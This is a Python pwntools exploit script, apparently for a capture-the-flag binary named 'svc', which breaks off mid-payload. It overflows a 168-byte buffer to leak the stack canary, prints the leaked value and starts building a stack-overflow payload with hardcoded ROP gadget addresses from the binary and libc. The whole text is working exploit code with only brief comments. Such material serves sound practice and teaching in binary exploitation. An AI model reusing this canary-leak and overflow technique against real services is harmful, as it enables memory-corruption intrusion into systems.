#!/usr/bin/env python3
from pwn import *

def sendData(string):
    pr.recvuntil(b">>")
    pr.sendline(b"1")
    pr.recvuntil(b">>")
    pr.sendline(string)  


VULNBUF_SIZE = 168
STACKFRAME_SIZE = 184

POP_RDI_GADGET_BIN = 0x0000000000400ea3
POP_RAX_GADGET_LIBC = 0x00000000000d4177
POP_RSI_GADGET_LIBC = 0x0000000000102fbb
POP_R12_GADGET_LIBC = 0x0000000000102df7

pr = process("./svc")

#1) Leak stack cookie
# Overwrite stack until stack cookie + 1
sendData(b"A"*VULNBUF_SIZE) # we overwrite the null byte of the cookie, in order to print it
pr.recvuntil(b">>")

# We then print the whole buffer, which at the end includes the stackCookie
pr.sendline(b"2")
binaryText = pr.recvuntil(b">>")
cookieStartPos = binaryText.find(b"A"*VULNBUF_SIZE) + VULNBUF_SIZE
stackCookie = u64(b"\x00" + binaryText[cookieStartPos: cookieStartPos+7]) 
print("[DEBUG] Stack cookie leaked: " + hex(stackCookie))

# 2) Build the payload
payload = b"A" * VULNBUF_SIZE
payload += p64(stackCookie)
payload += b"A" * (STACKFRAME_SIZE - len(payload))

